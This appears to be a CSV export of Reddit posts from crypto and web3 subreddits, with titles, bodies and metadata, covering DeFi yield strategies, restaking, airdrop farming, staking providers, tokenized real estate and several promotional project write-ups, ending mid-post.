"Once the bear market ends, many start-ups will appear - keep an eye out for pump-and-dump schemes.","despite the latest problems in crypto - such as usdc depegging - we will eventually return to a bullish position. i'm sure that most of us have seen or heard about the 100x and 1000x projects that are often seen right after a bear market ends. and in some cases we can even make money out of it. i suspect that many people are already looking into start-up projects with the potential to grow during the next bull market, regardless of whether or not this bear market ends soon (i believe that it will take a while). making informed decisions is essential. you should study tokenomics, research the developers, and look at the rewards system most of all. it is common for start-up projects to use a rewards system that encourages dumping at high prices. pumps and dumps exist for this very reason. the majority of projects have a lot to gain by adopting a rewards system based on adoption, such as dafi with their 1:1 synthetic token. it is already doing wonders for them. the dafi protocol reward system is based on adoption, meaning that users are rewarded for using the protocol and for introducing new users to the network. this system of rewards encourages users to spread awareness of the protocol, helping to drive adoption and create a more robust and vibrant network. you should never jump into any project - or any investment for that matter - without doing a thorough research first. always be aware of potential risks and understand the technology behind it. ask the right questions and do the necessary due diligence to make sure the project is worth your time and money. always remember to invest responsibly.",25,28,1.0,2023-03-13 13:53:19,web3,BlockchainStartups,lauromafra,False,36.2

Real Estate - The future of blockchain,"from purchasing a new house to selling real estate, blockchain technology can streamline time consuming processing while reducing costs and errors. the real estate investing game as we know it is on the brink of undergoing some significant and sizable changes. most notably, blockchain technology is revolutionizing how the industry works from the inside out. here are some of the ways that blockchain is impacting real estate investments: \- tokenization: blockchain is able to tokenize the ownership of assets – real estate or otherwise – which ultimately democratizes ownership and makes it to where anyone with any amount of money can get some skin in the game. \- smart contracts: smart contracts are automated contracts that self-execute with very specific instructions that are written in code and stored in the blockchain. they’re written in a “solidity” programming language, which uses “if-this-then-that” language. this has the ability to automate rent payments and all other financial aspects of real estate relationships. \- more rewards and opportunities: blockchain has the potential to remove so many of the barriers to entry that keeps middle-class individuals out of the investing game. for example, landshare is a project in this space that provides a hassle-free alternative to traditional real estate investments. they also allow you to earn yields on your real estate by staking stablecoins without any risks or commitments. \- lower costs: when intermediaries are cut out and contractual processes are streamlined, this results in lower costs for both buyers and sellers of investment real estate. some or all of the following may be eliminated or reduced in the very near future: loan fees, inspection costs, registration fees, transfer fees, taxes, commissions, and underwriting costs. \- new classes of investments: with tokenization, fractional ownership, and smart contracts, it’s possible that entirely new classes of real estate investments will emerge. from homeowners selling garage space to mobile home park investors helping tenants become property owners, there’s potential for a serious shakeup in this sleepy space. what are some more interesting use cases of blockchain technology that are being used in the real estate industry?",41,6,0.9,2021-10-04 19:13:53,web3,BlockchainStartups,Wolf_Joe,False,36.0

DeFi personal crisis,"hello everyone, i have a question for discussion/comparison with those who are more experienced than i am. i've been involved in defi for several years now. i stopped spot trading a while ago and dedicated myself to daily (and intensive) study of protocols for liquidity mining, lending/borrowing, looping, and various other strategies to generate passive income through defi. like many, i’ve experienced both the good and the bad times in this sector. i saw the 2020 bull run pass me by (i was still in the learning phase and hadn’t invested any money), entered in 2021 only to watch everything go down, and ended my first year with a 75% drawdown, though without realized losses. no big deal, i knew what to do and managed to recover, making several tens of thousands bucks in the following months. i’m not looking for memecoins or a quick get-rich scheme; i'm searching for a sustainable and flexible strategy that can be consistently applied regardless of market conditions. to date, my biggest mistake has been (quite simply) never taking profits over these years, and now i find myself with a six-figure portfolio and wanting to evolve once again, playing more seriously before the next bear market in 15-18 months. i have a vague and simple idea in mind: entering through lps, generating fees during the range, taking profits via dca, and then putting them into lending protocols in stablecoins, waiting for the next dip to reinvest. however, i’m not convinced—i have quite a few doubts about this. the first is whether it even makes sense. in my idea of entering/exiting the market with dca using clp v3, the biggest doubt is what to do with the profits. or rather, after entering at x and exiting at x+5, once i have only stablecoins, what do you recommend i do at that point? many people say that you should wait for the next crash with the profits. but i don't think that's the right approach, nor is it predictable. it's a bit like timing the market… and i want to avoid that. additionally, having too narrow a range entails an impermanent loss that could see me missing out on 20-30-50% more profit that i could have made, not to mention outside the range, where it wouldn't even be compensated by potential lp fees. so, to summarize and organize a bit: to date, defi allows me to cover common expenses (bills, groceries, and the occasional dinner out). but i want more. i'm not sure i'm using 100% of the potential this sector offers. hence my dilemma, and my question: is there anyone who has a ""serious"" defi portfolio and has been operating for several years who would be willing to share their approach with me? i know nfa, just for inspiration. i can't seem to break out of the 4-6% range. i’d like to reach at least 10-15%, consistently. i want to increase my income from this sector by using the opportunities it offers, but it feels like i’m moving blindly since i’ve never met anyone in my circles who operates in or is even remotely interested in investments, so i’m moving by trial and error. any advice is welcome, but please, no memecoins, gambling, or other nonsense like that. let's leave those to the gurus. thanks to anyone who contributes.",19,37,0.96,2024-08-13 12:09:15,web3,defi,DeFi_IKZ,False,35.800000000000004

Restaking: Earn Even More on Your Crypto,"based on the peculiarities of proof-of-stake (pos) blockchains, staking your crypto helps secure the network and rewards you in return. but with the concept of restaking, things took another turn. you not only start earning more for your crypto but also contribute to the security of other protocols and layers without needing to commit more funds. this creates a snowball effect, where you earn interest on your initial stake and on the accumulated rewards. over time, this compounding can significantly boost your overall earnings. how it works: stake your crypto on a restaking platform: these platforms act as intermediaries, allowing you to participate in restaking without the technical complexities. earn rewards: as with normal staking, you'll receive rewards for helping secure the network. automatic reinvestment: the restaking platform automatically takes your earned rewards and restakes them for you. this continuous reinvestment fuels the compounding effect. where to restake: several platforms offer restaking services, with varying features and supported coins. here are a few popular options: eigenlayer (multiple): a leading player in the restaking space, eigenlayer allows you to contribute your stake to the security of various emerging blockchains. rocket pool (eth): a user-friendly platform specifically for restaking ethereum. solflare (sol): solana's built-in restaking feature makes it easy to compound your sol rewards. parasail network (fil): this platform leverages restaked fil to power its decentralized sla engine. yearn finance (multiple): this defi giant supports restaking for various tokens, offering flexibility across different protocols. are you using restaking to boost your defi earnings? which platforms do you recommend? let's discuss the potential of restaking and how it can shape the future of defi!",33,18,0.88,2024-07-22 10:26:42,web3,defi,joke754ag,False,35.8

The Potential of Non-Fungible Equity,"one of the major challenges facing defi is the issue of overcollateralization and illiquidity. as we look for innovative solutions, one concept that has caught my attention is the tokenization of real-world assets (rwa). this approach has the potential to revolutionize defi by addressing these pressing issues. within the realm of tokenizing real-world assets, there are several projects worth exploring, including mnicorp, polytrade, realionetwork, and many others. these projects introduce novel models and approaches to incentivize user participation and tap into the untapped potential of tokenizing assets. however, let's shift our focus to the fascinating concept of non-fungible equity (nfe) and its role in bridging traditional businesses into the digital portfolio of defi. nfe offers an inclusive opportunity for users to invest in a diverse range of real-world assets. with nfe, the traditional barriers of illiquidity and limited access are shattered, providing increased liquidity and broader investor participation. this groundbreaking approach allows users to stake on a variety of rwa projects that are chosen and funded by the community itself, ensuring sustainability and reducing concerns about liquidity. the transparency and resilience of nfe in a decentralized environment make it a powerful tool in shaping the future of defi. by embracing nfe and exploring tokenization of real-world assets, we unlock numerous benefits, including improved transparency, reduced transaction costs, and wider access for investors. let's dive deeper into the potential implications and opportunities that arise from tokenizing real-world assets and harnessing the power of non-fungible equity in the defi landscape.",33,16,0.94,2023-05-19 12:36:28,web3,web3,krimmelnnd,False,35.6

INTEGRATING REAL-WORLD LUXURY ASSETS INTO NFT,"&#x200b; i remember a good friend of mine who loves branded products like clothing, bags, accessories and shoes. there are days where she will skip her lunch just to save money to buy expensive items. with her addiction to luxury items, she decided to put up a small pop up boutique for used or pre-owned luxury bags. she knows her niche very well. there's no need for her to buy expensive equipments just to test the legitimacy of an item. she can easily check if the items are original or not. however, that overconfidence in herself led her to where she at right now. depressed. struggling. almost bankrupt. the stage in business where entrepreneurs doesn't want to experience. but, this is where my friend is at right now. it all happened with just one mistake - buying counterfeit items unknowingly. imitations or fake items today transform into something you can no longer distinguish easily because of advanced technology. so in business, we really need to adopt the changes. with the recent turn of events in the world due to pandemic we learned to embrace the importance of digital transactions, and one of that is cryptocurrency. to associate digital assets to my friends incident, i bumped into this defi project that deals with counterfeit luxury products which is **luxfi**. &#x200b; **luxfi is one of the world’s major defi ecosystems for luxury assets. it is a highly accessible platform that enables real-world luxury asset-backed nfts creation for buying/selling, collateralized lending, auction trading and fractional ownerships in our ecosystem. #luxfi will innovate the luxury industry by making it a safer environment for owners and consumers worldwide, effectively addressing the prevalent issues facing the luxury industry and bridging the gap between real-world luxury assets and #defi powered by nft.** &#x200b; if only i had known this before, my friend can still somehow survive the mess in her business. however, i think it is never too late for her to bounce back so i'll introduce her this innovative blockchain project exclusive for fancy, luxury items. just sharing my experience 'coz i know this unique project deserves a spot in the crypto space. it will definitely benefit everyone who's into expensive products. &#x200b; **check their communities here:** * **website:** [**https://www.luxfi.io**](https://www.luxfi.io) * **twitter:** [**https://twitter.com/luxfiofficial**](https://twitter.com/luxfiofficial) * **telegram official group:** [**https://t.me/luxfiofficial**](https://t.me/luxfiofficial) * **medium:** [**https://luxfiofficial.medium.com**](https://luxfiofficial.medium.com) * **reddit:** [**https://www.reddit.com/r/luxfinance/**](https://www.reddit.com/r/luxfinance/)",40,1,0.96,2021-08-10 00:01:13,web3,BlockchainStartups,Ozanconrad,False,34.0

Realization or epiphany of my expectations for profits,"hey folks, so, random thought, but after losing a little bit of money this past week trying to trade memecoins for massive gains, i realized, i'm setting my expectations too high. i make $20/hr at the farm i work on, that works out to $0.333333333333333 a minute. so if i start using a something like bonkbot, watching the one second chart, and sniping the spikes and drops, so long as i'm making $0.33/$0.34 a minute, i'm making as much as i do at my job. instead of watching my small plays go up by even just $2-$10, then not executing my sales because i'm wanting more, that i'm being silly. so long as i'm covering priority fees, accounting for slippage as well as price impact, i should just be using a bot to take any profits at all. if i'm making anything over $0.33/$0.34 a minute, and put in a few hours a day, that's still bringing in money i didn't have, and will leave me better off than waiting for a moonshot, and missing my sell targets, ending up taking losses. anyways, that's my random 5:30am epiphany. call me a ""brokie"", which would be accurate, but i think sticking with lower expectations, making lots of small trades with a bot, will be much better for me than hoping to catch a moonshot, and ending up losing on a bunch of trades. hope this helps someone else with their strategy as well who's in a position like mine.",18,35,0.91,2024-11-04 04:35:44,web3,solana,tsbsa,False,33.9

GenesisShards announces the FIRST EVER Polkastarter DUAL IDO on ETH & binance's BSC .,"genesis shards is a decentralized ecosystem powered by polkadot that redefines nfts as defi options, creating a permissionless environment of interchain liquidity for pre-ido tokens. the defi ecosystem has taken leaps and bounds over the last few years. however, it still faces some acute bottleneck issues in the pre-ido space, with low token liquidity due to lack of a tradable market and inconsistent otc trade practices that have a high default risk. genesis shards was created to usher in a new paradigm where network participants can efficiently and safely gain access to and trade pre-ido tokens, while projects can leverage token liquidity early in the life cycle, build strong community support early on in their journey, and also get a sense of price discovery. this is done by essentially “nft-ing” the otc market: transforming nfts into a liquidity vehicle for pre-ido tokens. genesis shards aims to pioneer the defi nft space by reimagining nonfungible tokens as defi options. genesis shards’ vision has attracted the support of participants from every corner of the defi sphere. our funding rounds were crafted to be inclusive of the entire ecosystem. unlocking a new frontier in defi: a pre-ido marketplace on nonfungible tokens the defi space today faces some big problems when it comes to pre-ido trading. though initial dex offerings have rapidly gained acceptance as the go-to choice for token distribution, there are very few avenues for pre-ido trading for the community. on the other hand, projects have limited community participation and little sense of price discovery in the early stages. genesis shards aims to solve the issues faced by defi projects and their communities in the pre-ido space by building the first marketplace for pre-ido tokens on nfts. by wrapping time-locked fungible tokens into nfts, genesis shards will create a new market for previously illiquid tokens. this will be one of the biggest polkastarter ido’s imo [twitter ](https://twitter.com/genshards?s=08) [telegram ](https://t.me/genshardschat) [website ](https://www.genshards.com/)",40,1,0.95,2021-04-04 01:13:25,web3,BlockchainStartups,Cryptology3366,False,33.9

Microsoft Edge Introduces Built-In Wallet for NFTs?,"microsoft’s edge browser is set to incorporate a built-in wallet for cryptocurrencies and nfts soon. last week, an anonymous insider known as “albacore” leaked screenshots on twitter, showcasing this new feature. while the tech giant has yet to comment officially, it appears that the $2 trillion company is preparing to make a significant entry into web3. microsoft’s rationale behind adding a crypto and nft wallet to edge the inclusion of a crypto wallet in the edge browser aims to streamline the web3 experience for microsoft’s customers. users’ crypto funds will be integrated into the existing interface for stored credit cards, eliminating the need for third-party applications like metamask or coinbase wallet. this development should make it easier for non-crypto native individuals to begin using cryptocurrencies. the leaked screenshots also highlight the non-custodial nature of the wallet, meaning users maintain full control over their crypto assets, and microsoft cannot access private keys or freeze funds. this aspect aligns with the crypto community’s core value of “freedom to transact.” features of the microsoft edge crypto and nft wallet the revealed screenshots display an appealing user interface for edge’s crypto users. the main page provides an overview of crypto holdings with an attractive graph depicting the wallet’s portfolio balance over time. another tab allows users to access a transaction page for sending various cryptocurrencies and viewing completed transaction history. a separate page features web3-focused headlines, linking to popular crypto blogs and breaking news. interestingly, the wallet also includes a dedicated nft page that aggregates content from multiple nft marketplaces, resembling popular trading sites like gem, genie, or blur. microsoft seems to allow users to purchase nfts from various sources and offers an organized, user-friendly gallery view for displaying them. one undisclosed tab labeled “connections” raises speculation about its purpose — perhaps a social network within the microsoft edge crypto interface or the ability to follow intriguing nft collections. alternatively, it could be a simple list of saved contacts, wallet addresses, or frequent transaction parties. more information should be available soon. significance of the microsoft edge wallet by integrating crypto and nft capabilities into one of their flagship products, microsoft is providing 232 million edge users with a straightforward way to create a wallet and engage with web3. this move marks another crucial step in promoting the mainstream adoption of cryptocurrencies and nfts.",25,24,0.91,2023-03-28 07:49:12,web3,CryptoTechnology,happily_unlawful,False,33.7

The Best Staking-as-a-Service (SAAS) Providers,"**the best staking-as-a-service (saas) providers** in approximate order, based mostly on their reputation among redditors (i read more than i post). for each of these, the user controls their withdrawal keys. **allnodes** it's $10/month for their advanced plan, which is the cheapest one that includes mev (it's worth the extra $5/month). that's equivalent to a fee of only 0.16%, close to zero! they're a top-15% performer on rated network over the last 30 days, and mostly use the teku (a minority client) consensus client; they're also large, if that gives you comfort: 2.6% of all staked ether. **ethpool** they charge 15% of mev (10% for 3 nodes, 8% for 30 nodes). that comes out to about 2.9% of all rewards (so yes, about 18x allnodes). i can't find them on rated network. they use minority clients: lighthouse and nethermind. **blox staking** they have a 0% fee forever (not a typo). their effectiveness rating on rated network is below the 50th percentile as i write this. the company behind them is probably more focused on their new ssv network now. i noticed that their website gets barely any traffic anymore (it ranks in the millions), but rated network says they still stake about 0.53% of staked ether, and they have an active discord. they use mostly prysm (the most popular consensus client). **best solution for leftover amounts when you've staked all your 32-eth blocks:** competition in staking is heating up daily (e.g. with dvt solutions coming online), but i'll nominate stakewise v3. you can stake any amount and don't need to get an lst. you get to choose an operator. perhaps 4% fees is typical, but i see one offering 1%. some reputable operators to consider are x (please reply with your opinions). **some reasons you might want to use saas:** you don't want lsts because you'd have to generate a capital gain when selling eth for them; and they have high fees, typically 10% for lido's steth. you don't want to solo stake because you may not feel technically competent enough; you may have unreliable internet (or limited capacity) or electricity; or you may not have a stable place for your node (e.g. you're a digital nomad).",34,8,0.97,2023-12-28 14:53:31,web3,ethereum,CaptainOfTheGate,False,33.3

Upcoming promising projects on Binance Smart Chain,"binance launched binance smart chain (bsc) in september 2020 as an innovative solution to bring programmability and interoperability to binance chain. since then, there have been many different projects that have expanded on it. in view of ethereum’s inability to harbor the high amount of transactions that the defi boom has brought to the industry, both users and defi protocol operators are in search of alternative solutions to build on. that’s one void binance smart chain aims to fill. here are some popular projects on bsc- **venus (xvs):** venus enables the world’s first **decentralized stablecoin, vai**, built on the binance smart chain that is backed by a basket of stablecoins and crypto assets without centralized control. it works as an **algorithmic money market system**, aiming at bringing a decentralized lending and credit system to the bsc. all venus protocol assets are bound by the **bep-20** standard. funds held within the protocol can earn apy’s based on the market demand for that asset. interest is earned by the block and can be used as collateral to borrow assets or to mint stable coins. venus is currently one of the largest projects of the bsc and manages a total of almost **5 billion us dollars**. **pancakeswap (cake):** pancakeswap, running on top of bsc, is an **automated market maker (amm)**. it is working not only as a dex but also as a decentralized finance (defi) services provider. in terms of functionality, it is almost identical to uniswap (uni) and sushiswap (sushi). some of the features currently being offered by pancakeswap include trading, earning interest on different yield farms, and participating in the pancakeswap lottery. the pancakeswap lottery allows users to match 4 numbers on the tickets they purchased and win 50% of the entire lottery pool. however, users that match 2 or more numbers in the correct position are also guaranteed to win a reward. the total incoming value to dapp’s smart contract is **$8.13m** and the volume in 24 hours is **$23,684,576**. **pancake bunny (bunny):** launched with the interest to expand the development of yield aggregator protocols on the binance smart chain, pancakebunny is a fast-growing **yield optimizer that is used for pancakeswap**. bunny is all set to join the **cross-chain swap** technology, allowing ethereum holders to be able to farm yields on the bunny platform. the protocol empowers users to leverage their yield-seeking tendencies to optimize yield compounding strategies on the bsc. **now, if you missed your trains to these projects, here are the top upcoming projects on binance smart chain** &#x200b; * **knight war** it is an upcoming play-to-earn game in the style of the idle defense genre, built on binance smart chain and later polygon layer-2 scaling solution to utilize its low fees, fast transaction speed, and large user base. craft the best weapons and build your team of 5 to defend your castle and fight other players! we have designed a game with a twist in nft where the focus is on the weapon system rather than the characters. the game does not aim to be too intensive. we want it to be simple and fun, where anyone could relax, entertain and still earn real money! * **bnbcash** bnb cash is the native token of bnb fintech. running on the bep20 platform, bnb cash is fast, low in transaction fees, and most importantly - secure. here's a small glimpse of what the team have in store for bnb fintech **p2p crypto marketplace** a marketplace where people can buy, sell, and trade every day items using cryptocurrency. bnb cash will be the primary currency, however the team will integrate other tokens in the future. **crypto wallet**: not your average crypto wallet. the bnb fintech wallet will house our developments so users have a single access point to streamline everything **airdrops**: airdrops for early investors over a five year period with two airdrops in the first year * **monsoon finance** monsoon improves transaction privacy by **breaking the on-chain link between source and destination addresses.** it uses a smart contract that accepts network token deposits that can be withdrawn by a different address. to preserve privacy a relayer can be used to withdraw to an address with no token balance. whenever tokens are withdrawn by the new address, **there is no way to link the withdrawal to the deposit, ensuring complete privacy.**",36,5,0.95,2021-09-29 12:48:42,web3,BlockchainStartups,PatriciaHarris_,False,33.099999999999994
Value proposition & use cases for web3 - specifically privacy,"hi all! i recently brainstormed with a few friends about the value proposition and possible use cases of web3. the majority of people describe web3 as the next generation of the internet, where users have more control over their data and can interact with decentralized applications. but they can't go beyond that. i recently played around with lens.xyz and found it to be a pretty cool concept (except that it needs more users). do you know any other cool dapps that are already useful today (outside of defi, which theoretically also belongs to web3)? also, many people talk about the use case of ""ownership"". i understand that the vision of web3 is that users will own their data in digital wallets and port them from platform to platform (from dapp to dapp). how would that specifically work? how could i take all my tweets to another platform with my digital wallet, if i get fed up with twitter? what standards will be needed? last, one of the things mentioned frequently is web3 and privacy. however, in a digital wallet (e.g. on ethereum) everything i own is public. my transaction history, all my nfts, etc. how can this be more private than what we have now? i think web3 has tremendous potential, but it needs us to discuss it critically. i would be very thankful for insightful comments and a fruitful discussion.",18,34,0.86,2022-12-10 10:23:06,web3,web3,levijohnson1,False,33.0

DIVI: A Global Payment Platform,"you are probably wondering why recently there has been a rise of different types of cryptocurrencies from blockchain companies. you might also ask yourself, what makes each of these cryptocurrencies different from one another? for those people who are already experienced enough in engaging with divergent cryptocurrency platforms, it would be really easy to distinguish the ups and downs of each blockchain. however, for novice consumers, it will take some time to grasp the necessary information before taking part in these crypto-related activities. if you're reading this. i am going to share my thoughts about the competitive edges of divi, and what makes it a top-notch crypto platform. since its inauguration, the divi project has envisioned and strategized to establish its blockchain with a humanized protocol, allowing the development of innovative and user-centric solutions. following are the divi's note-worthy attributes, setting it apart from other cryptocurrencies: **1. user-friendly smart wallet/s –** focusing on the user-friendly aspect of an application, the divi project was able to come up with an uncomplicated smart wallet/s that offers a straightforward approach towards the handling and use of crypto and local currencies alike. to date, the divi project supports the divi wallet, midas protocol universal crypto wallet, and polispay wallet. these easy to follow applications can be utilized on modern smartphones, allowing its stakeholders to invest, exchange, deliver and earn crypto and local currencies anytime and anywhere, as long as they have access to their respective digital wallet/s. **2. five-layered, one-click masternode system –** users who are holding divi coins can earn more by setting up and maintaining a five-layered masternode system. simply define by the divi team, masternodes are computers that run a divi wallet and perform utility functions for the network such as storing metadata and processing special transactions these divi nodes are composed of five tiers of affordability and rewards distributed based on the user's undertakings, starting from copper level, silver level, gold level, platinum level, and up to diamond level. the higher the tier, the greater and bigger the offer of rewards. it shall be noted that the divi project was the first to announce the invention of the revolutionary and comprehensible single-click masternode installation process. these masternodes can be easily set up anywhere at home or in a cloud platform by users who are interested and eligible in doing so. **3. lottery blocks –** the divi platform offers a once-a-week lottery block to which users can participate by staking wallet with a minimum amount of ten thousand (10,000) divi, as well as connecting to the divi network. to be more specific, a winner can score two hundred fifty-two thousand (252,000) divi coins. ten other lucky participants will be given twenty-five thousand and two hundred (25,200) divi coins. **4. multi coin system –** divi's smart wallet/s do not only work and offer services toward divi but also cater to bitcoin, bitcoin cash, ethereum, and the us and euro local currencies. the divi project team is already in discussion with other different blockchain companies to integrate their cryptocurrency into divi's all-in-one digital wallet. **5. atomic swaps and exchanges –** stakeholders can utilize the ""atomic swap"" option to switch and/or exchange their digital assets between types of cryptocurrencies within divi's smart wallet/s. not only that it allows exchange, but it also permits users to buy, sell, and convert crypto to local currencies and vice versa. **6. vaulting –** investment and placement of earnings to one system or application also entail with it the indispensable necessity of security. vaulting, as the name suggests, offers a variety of savings opportunities and also secures funds in a time-locked account that cannot be retrieved or accessed by anyone. considering its uncompromising feature, the user must strictly follow the designated date and time to which the assets can be acquired. **7. scalability/future readiness for crypto adoption –** rest assured, the divi project has already organized the future-proof blockchain that is running ten (10) times faster than bitcoin itself. this measure was duly considered by the team in preparation for the general public's future adoption and use of cryptocurrencies for their day-to-day financial transactions. highly pointed out by the divi team, the divi project shall also soon launch its own ""lightning network"" that will allow millions of speedy off-chain side channels micro-transactions. **8. advanced governance system –** a very compelling edge of the divi platform where stakeholders can actively participate in the divi governance system, authorizing users to propose ideas that will help improve the overall structure of divi, including but not limited to: inflation rates, exchange fee amounts, and many more. *the divi project has set its goal and vision to continuously improve the name of cryptocurrency by making it accessible and easier to understand among people in any part of the world. with its top-of-the-line attributes, divi shall stand out as one of the most remarkable crypto platforms in this day and age.*",35,4,1.0,2021-03-16 14:08:09,web3,BlockchainStartups,Vladn00ne,False,32.6

Why Eth UX is getting so much better (or at least could),"i used to work in an nft company, but no longer do. when i entered the industry, ux was, well, horrific. everything took forever, interfaces were cryptic. wallets were ugly software filled with (to most people) meaningless numbers. you constantly paid dozens of dollars for transactions that didn't even go through. plus, onboarding to crypto as a new user felt like being initiated to a cult's rituals with seed phrases and stuff. but i recently poked around again and saw that there have been a bunch of improvements: &#x200b; * transactions are fast(er) and cheap(er)—on many l2s they're less than a cent. * wallets are so much faster and uis are so much clearer. if you're using a newer wallet, you'll know exactly what a transaction does * many apps no longer assume you're a power users who knows every bit of crypto vocabulary. being able to watch this industry from the outside in is a ton of fun because you get to view user experience evolve in real time. here's why i think ux is getting better: * infrastructure i: l2s make it faster and cheaper to do more trivial transactions. it's so interesting how something app builders have no control over (speed of infra) meaningfully affects the user experience. * infrastructure ii: stuff like erc-4337 and other protocol improvements enable building new things like account-abstracted wallets and embedded wallets. again: we can have the best ux intents, but the core infrastructure needs to enable builders to create a certain experience. * people actually want better ux now. before the 2020/2021 nft boom, crypto mostly targeted engineers. the boom flooded the industry with non-technical people, who didn't get etherscan, metamask etc. and made it work. but this misunderstanding led to a ton of scams and people not participating because the barriers were so high. when people started demanding ux that's understandable to ""normies"", new wallets and other interfaces came along to serve that need. * interface providers: there's a few companies now that basically offer ""good ux as a service"" and provide web3 companies with the libraries and stuff that they need to improve their ux. it's a lot of fun to observe this happening because the changes are so elemental. outside of web3, there's such a ux arms race that a cool new loading animation gets talked about. but in this industry, you can see how fundamental things get built. anyone interested in the evolution of products in an industry should watch crypto evolve (with or without participating). it's such an interesting case study. btw, i wrote a full breakdown of the topic here if you're curious: [https://www.commandbar.com/blog/crypto-web3-ux/](https://www.commandbar.com/blog/crypto-web3-ux/)",34,10,0.81,2024-04-23 08:38:11,web3,ethereum,finncmdbar,False,32.5

4 protocols with potentially underfarmed airdrops.,"the points meta is kind of taking over with blast and eigenlayer leading the way and solana airdrop season showing consumer fervor for these drops. here, i’ve gathered 4 protocols which will potentially do an airdrop based on communications from the team and also the fact they have a points system but no token. as always in defi, dyor and decide for yourself if any of these protocols are safe, especially as they are newer, smaller, and less battle tested than an aave or a curve. **reserve x diva - basedeth** reserve is a stablecoin protocol on ethereum and base. essentially, their stablecoins are minted from a basket of collateral assets to offer better diversification and are overcollateralized by their protocol token ($rsr). this means: 1. they tend to be safer in the sense that there is less doomsday risk from a depeg event with additional backstops from rsr 2. rtokens have interesting properties like diversified yield and flexible collateral assets. https://imgur.com/olnmdxd for example, this is their eth staking index called eth+ which contains lido steth and rocket pool reth with an additional 2% backing from staked rsr. reserve is collaborating with a protocol called diva that is doing interesting things with staking infra, namely having redundant nodes to increase the resilience of their network. [https://twitter.com/reserveprotocol/status/1760817701206081841](https://twitter.com/reserveprotocol/status/1760817701206081841) if you deposit into basedeth on the base l2, you are allocated diva tokens on a schedule. this is basically a confirmed drop so if you hold eth, it might be a good idea to bridge a small amount of it to base and try it out. again, do so at your own risk but reserve is a solid and well audited protocol with a competent team. base gas fees also gud. don’t send all your eth in and like anything else, risk management is key. **wasabi protocol – nft degening** [https://www.wasabi.xyz/](https://www.wasabi.xyz/) wasabi offers asset backed derivatives on ethereum and blast nfts as well as some shitcoins (like mog). they offer perps and options for traders. they are currently offering wasabi points and blast points if you use it on blast (if you’re brave enough kek blast is fraught with issues but is fine for some play money just be prepared to lose it all if the 3 of 4 multisig gets yoinked). there’s also some shit called metastreet that if you use on blast you get tripled points (wasabi plus blast plus metastreet) idk what that is but might be worth something down the line (again, dyor). you earn points on wasabi by trading or providing liquidity to their derivatives protocol and you can boost your points by holding wasabi pass nfts up to 2x depending on how many you hold. each wasabi pass nft gives you 0.1x boost up to 10, for a max of 2x. they’re on ethereum so gas of purchasing them might be an issue but the good news is if you buy them on ethereum, the pass and boost carries across to blast too. [https://imgur.com/js4hk4d](https://imgur.com/js4hk4d) wasabi will pop if the overall eth nft market sends like it did in 2021. that bullrun didn’t have any nft derivs at all, imagine if you could have shorted the bayc top all the way down and how valuable that protocol might have been. they have a very unique offering and might be a good option if you hold eth nfts and want to hedge a little bit and might as well earn some wasabi points on the way. you can also send eth and other assets to earn yield based on trading activity, this is a bit risky as you’re essentially collateralizing the derivatives so allocate accordingly. not sure if a token is confirmed yet but if they’re giving away points might be a safe bet. **propellerswap – searching for points** [https://swap.propellerheads.xyz/](https://swap.propellerheads.xyz/) [https://imgur.com/undefined](https://imgur.com/undefined) propellerswap are searchers. basically, like an on-chain limit order. you give them your desired trade params and they go out and find the best route for you, similar to cow if you’re familiar with that. i think they do cow searching too so yeah big brained stuff. honestly too mid-curved to understand intents too much. basically, they’re a complex order type and will give you better price execution (i.e. less slippage) due to the fact they are route agnostic and can take into account other people’s orders too. they are currently offering points for swapping on their protocol. you get more points for more volume and boosts if you trade for consecutive days. currently on eth and zksync. if you trade on mainnet it might not be a bad idea to move some of that volume here. not sure what the points translate to so no guarantee of an airdrop but like anything with points, it’s a safe bet they will. **snipit – snap to earn** [https://lp.snpit.xyz/](https://lp.snpit.xyz/) this one is a bit of a long shot. not sure if they will have a token or anything and don’t know too much about it. apparently it’s big in japan but hasn’t really made it out of there yet (so maybe it’s deep alpha). basically you take pictures (think you get 2 a day) and battle with other people also taking pictures. interesting game fi mechanics that might resonate with normies (think competitive snapchat lol) for when this bull market really starts ripping. haven’t tried this one but there appears to be some kind of virtual currency (not a token afaik) or points or whatever. this is a half-baked thought at best but if you remember how big stepn and walk to earn bullshit was this has similar vibes to me. &#x200b;",15,35,0.94,2024-03-26 12:05:46,web3,defi,Federeyi,False,32.4

"Those of you who want the US to create a crypto reserve, would you rather that it be funded by tax payer's money or by additional US debt?","bitcoin and crypto reserves do not operate like the federal reserve or the treasury. monetary policy is controlled by the federal reserve, which can freely expand and contract monetary supply to help consumers and banks obtain loans at a given interest rate. the entire lending system is aided by the federal reserve. fiscal policy is controlled by congress and the treasury, which can issue new debt via treasuries. but unlike with the federal reserve and the treasury, the us government cannot magically conjure existing cryptocurrencies out of thin air. it has to buy them from the market. and buying them requires congress to either spend taxpayer money, or use existing debt to finance the purchase of crypto. even if they choose to mine it, mining and mining equipment are extremely expensive, not necessarily profitable, and requires funding. for those of you who want the us to have a large crypto reserve, where is the funding to buy that crypto going to come from? the fed is currently holding onto some crypto seized through scams and thefts like mt. gox, but it does not own that crypto. that crypto will eventually need to be returned to different owners, so sized crypto doesn't count.",0,69,0.46,2024-11-19 06:41:12,web3,CryptoCurrency,HSuke,False,32.2

Everyone loves a good use-case story,"ask yourself - do you actually believe in blockchain technology or do you just want to make money off of it? unless you are a leech or dumb, the answer should be both. this is why it makes me so pissed when i see people invest millions of dollars and hype the living crap out of web3 projects that don’t improve their web2 counterparts. i saw an ad on twitter for a web3 food delivery service startup. this is just saying “in addition to service fee, delivery fee and driver tip - our dapp also has gas fees and takes 20 minutes to verify a hash” web3 is super easy to hype up but long term investments will collapse if no value is added to existing utilities. if you think i’m a pessimist or “unwilling to submit to web3” ask yourself why nft’s and defi are pretty much the only features consistent across the different l1 blockchains.what everyone is underestimating is one of the original reasons web3 was innovated in the first place: gaming. if you live under a rock and don’t know the story: wow debuffed one of vitalik’s in game items, demonstrating to him “the horrors of centralized services” tokenization of video game entities is one of the most intuitive uses of tokenization: giving a user immutable ownership of a digital asset. linking video games, the metaverse, and nfts could radically change the way we play games. it isn't an industry with high economic barriers to entry like social media, so it is realistic to see how blockchain tech is useful here. the determining factor for the adoption or rejection of blockchain tech in mainstream pc gaming is going to depend on choosing the correct l1 to build the platform on. any in game economy requires quick transactions at a scalable level. furthemore, a sustainable community of platform developers, game developers and players will require significant investment from the l1. unfortunately, most blockchain foundations focus on investing in defi because it generates more investing users, aka more revenue. my pick for the l1 that will bring web3 into mainstream gaming is near. with pos and sharding it has the scalability and user-friendliness that l1’s like eth or cardano don’t have. most of the gaming platforms were initially created over ethereum blockchain but, after facing scalability 